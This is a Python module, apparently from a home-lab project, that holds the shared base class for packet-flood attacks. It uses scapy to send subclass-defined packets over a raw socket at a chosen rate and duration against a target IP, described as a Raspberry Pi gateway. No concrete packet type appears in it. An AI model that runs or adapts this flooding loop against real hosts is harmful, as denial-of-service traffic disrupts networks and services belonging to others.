"""Shared code for the packet-flood attacks (Template Method pattern).

The base class Attack does the sending loop (how many packets, how fast, for how long).
Every concrete attack only says what ONE packet looks like, in make_packet().
Uses scapy; on Windows it sends through Npcap, so run PowerShell as Administrator.
"""
import argparse
import time

from scapy.all import conf


class Attack:
    name = "attack"

    def __init__(self, target, port, seconds, rate):
        self.target = target
        self.port = port
        self.seconds = seconds
        self.rate = rate                      # packets per second

    def make_packet(self):
        raise NotImplementedError("every attack must describe its packet")

    def run(self):
        print(f"{self.name}: {self.target}:{self.port} for {self.seconds} s at about {self.rate} packets/s")
        sender = conf.L3socket()              # raw IP socket (needs admin rights)
        gap = 1.0 / self.rate
        sent, start = 0, time.time()
        next_send = start
        while time.time() - start < self.seconds:
            sender.send(self.make_packet())
            sent += 1
            next_send += gap
            pause = next_send - time.time()
            if pause > 0:
                time.sleep(pause)
        sender.close()
        took = time.time() - start
        print(f"done: {sent:,} packets in {took:.1f} s ({sent / took:,.0f} packets/s)")


def read_arguments(description, default_port):
    p = argparse.ArgumentParser(description=description)
    p.add_argument("target", help="IP of the Pi (gateway)")
    p.add_argument("--port", type=int, default=default_port)
    p.add_argument("--seconds", type=int, default=10)
    p.add_argument("--rate", type=int, default=1000, help="packets per second")
    return p.parse_args()
